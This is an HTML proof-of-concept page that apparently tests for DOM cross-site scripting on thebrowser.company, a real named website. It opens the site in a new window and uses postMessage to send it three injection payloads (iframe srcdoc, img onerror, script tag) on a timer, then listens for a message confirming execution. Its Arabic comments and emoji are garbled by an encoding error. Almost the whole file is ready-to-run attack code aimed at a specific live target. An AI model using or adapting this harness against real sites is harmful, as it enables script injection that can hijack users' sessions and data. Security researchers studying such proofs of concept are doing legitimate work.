<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC â€“ DOM XSS on thebrowser.company</title>
</head>
<body>
  <h2>ðŸ’¥ DOM XSS PoC â€“ thebrowser.company</h2>
  <p>Ø§Ù„Ù‡Ø¬ÙˆÙ… ÙŠØ¨Ø¯Ø£ ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§...</p>

  <script>
    const target = window.open("https://thebrowser.company", "_blank");

    const payloads = [
      {
        desc: "iframe srcdoc",
        html: `<iframe srcdoc='<script>parent.postMessage("XSS_EXECUTED","*")</script>'></iframe>`
      },
      {
        desc: "img onerror",
        html: `<img src=x onerror="parent.postMessage('XSS_EXECUTED','*')">`
      },
      {
        desc: "script injection",
        html: `<script>parent.postMessage("XSS_EXECUTED","*")</script>`
      }
    ];

    let i = 0;

    function sendPayload() {
      if (!target || i >= payloads.length) return;
      console.log("ðŸš€ Injecting:", payloads[i].desc);
      target.postMessage({ type: "inject", html: payloads[i].html }, "*");
      i++;
      setTimeout(sendPayload, 3000); // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªØ§Ù„ÙŠ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ
    }

    setTimeout(sendPayload, 4000); // Ø§Ù„Ø¨Ø¯Ø§ÙŠØ© Ø¨Ø¹Ø¯ 4 Ø«ÙˆØ§Ù†ÙŠ

    window.addEventListener("message", (e) => {
      if (e.data === "XSS_EXECUTED") {
        alert("âœ… XSS EXECUTED!");
        console.log("ðŸŽ¯ XSS payload confirmed!");
      }
    });
  </script>
</body>
</html>
